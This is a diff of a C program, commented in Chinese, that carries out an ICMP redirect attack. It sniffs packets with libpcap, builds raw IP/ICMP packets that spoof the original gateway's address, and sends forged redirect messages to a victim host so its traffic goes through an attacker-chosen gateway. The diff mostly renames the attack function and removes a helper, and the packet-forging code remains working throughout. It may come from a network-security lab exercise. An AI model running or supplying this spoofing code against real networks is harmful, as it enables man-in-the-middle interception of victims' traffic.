@@ -11,7 +11,7 @@
  * 5. 结束，pcap_close 
  * 
  * 重定向
- * 使用原始套接字 raw socket, sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)
+ * 使用原始套接字 raw socket
  * 构建IP头、icmp头、icmp数据
  * 
  */
@@ -137,103 +137,51 @@ u_int16_t checksum(u_int8_t *buf,int len)
 } 
 
 /*重定向攻击*/
-void icmp_redirect(int sockfd,const unsigned char * packet_data){
-
+void icmpRedirect(int sockfd,const unsigned char * packet_data){
 	struct ip_header *ip;
-    struct icmp_header *icmp;
-    //先设定好数据格式：ip头，ip数据=(icmp头，icmp数据)
-	struct packet_struct{
-        struct iphdr ip;
-        struct icmphdr icmp;
-        char datas[28];
-    }packet;
-	
+    	struct icmp_header *icmp;
+    //设定好数据报：ip头，icmp头，icmp数据
+	struct packet_struct
+	{
+		struct iphdr ip;
+		struct icmphdr icmp;
+		char datas[28];
+    	}packet;
 
 	//ip头 20字节
     packet.ip.version = 4;
     packet.ip.ihl = 5;
     packet.ip.tos = 0;  //服务类型
-    packet.ip.tot_len = htons(56);  //host to short
+    packet.ip.tot_len = htons(56);  //host to short 56=20+8+28
     packet.ip.id = getpid();
     packet.ip.frag_off = 0;
     packet.ip.ttl = 255;
     packet.ip.protocol = IPPROTO_ICMP;
     packet.ip.check = 0;
-    packet.ip.saddr = inet_addr(Ori_Gw_IP); //要伪造网关发送ip报文
-    packet.ip.daddr = inet_addr(Vic_IP);    //将伪造重定向包发给受害者
+    packet.ip.saddr = inet_addr(Ori_Gw_IP); //伪造网关发送ip报文
+    packet.ip.daddr = inet_addr(Vic_IP);    //把重定向包发给受害者
     
-    
-
     //icmp头 8字节
-    packet.icmp.type = ICMP_REDIRECT;
-    packet.icmp.code = ICMP_REDIR_HOST;
+    packet.icmp.type = ICMP_REDIRECT;//5
+    packet.icmp.code = ICMP_REDIR_HOST;//0
     packet.icmp.checksum = 0;
     packet.icmp.un.gateway = inet_addr(Redic_IP);
     struct sockaddr_in dest =  {
         .sin_family = AF_INET,
         .sin_addr = {
-            .s_addr = inet_addr(Vic_IP)
+        .s_addr = inet_addr(Vic_IP)
         }
     };
-    //拷贝抓到的IP包中的ip头和数据部分共28个字节 ，作为icmp重定向包的icmp数据部分
-	memcpy(packet.datas,(packet_data + SIZE_ETHERNET),28);
+    //将抓到的IP包的前28字节 ，作为icmp数据
+    memcpy(packet.datas,(packet_data + SIZE_ETHERNET),28);
     packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
     packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);
     
-    //sendto用于非可靠连接的数据数据发送，如UDP， 接收数据用recvfrom
-    //ssize_t sendto(int sockfd,const void *buf, size_t len, 
-    //int flags, const struct sockaddr *dst_addr, socklen_t addrlen);
-    //（发送端套接字描述符，待发送数据的缓冲区，待发送数据长度IP头+ICMP头（8）+IP首部+IP前8字节，
-    //flag标志位，一般为0，数据发送的目的地址，地址长度）  
-	sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
-    printf("redirect\n");
+    //sendto用于非可靠连接的数据数据发送，如UDP， 接收数据用recvfrom  
+    sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
+    printf("send icmp redirect\n");
 }
-/*解析IP数据包*/
-void checkIP(const u_int8_t *ip_packet)
-{
-	const struct ip_header *ip;
-	ip = (struct ip_header*)ip_packet;
-	int ip_header_len = ip->ip_header_length*4;
 
-	if(ip_header_len<20)
-	{
-		printf("Invalid IP header len!\n");
-		return;
-	}
-
-    //寻找攻击对象发送的数据包
-	if(!strcmp(Vic_IP,inet_ntoa(ip->ip_source_address)))
-	{
-        int sockfd,res;
-        int one = 1;
-        int *ptr_one = &one;
-        //创建原始套接字
-        if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
-        {
-            printf("create sockfd error\n");
-            exit(-1);
-        }
-        //发送数据时，不执行系统缓冲区到socket缓冲区的拷贝，以提高系统性能，应为
-        /**
-         设置sockfd套接字关联的选 项
-        sockfd:指向一个打开的套接口描述字
-        IPPROTO_IP：指定选项代码的类型为IPV4套接口
-        IP_HDRINCL：详细代码名称（需要访问的选项名字）
-        ptr_one：一个指向变量的指针类型，指向选项要设置的新值的缓冲区
-        sizeof(one)：指针大小
-        */
-        //开启IP_HDRINCL选项，让用户自己生成IP头部的数据
-        res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
-        if(res < 0)
-        {
-            printf("error--\n");
-            exit(-3);
-        }
-
-        icmp_redirect(sockfd,ip_packet);
-        close(sockfd);		
-	}
-}
 /*解析数据包*/
 void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t * packet) 
 {
@@ -311,8 +259,8 @@ void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t
         exit(-3);
     }
     //重定向攻击
-    icmp_redirect(sockfd,ip_packet);
-    close(sockfd);	
+    icmpRedirect(sockfd,ip_packet);
+    close(sockfd);
     return;
 }
 
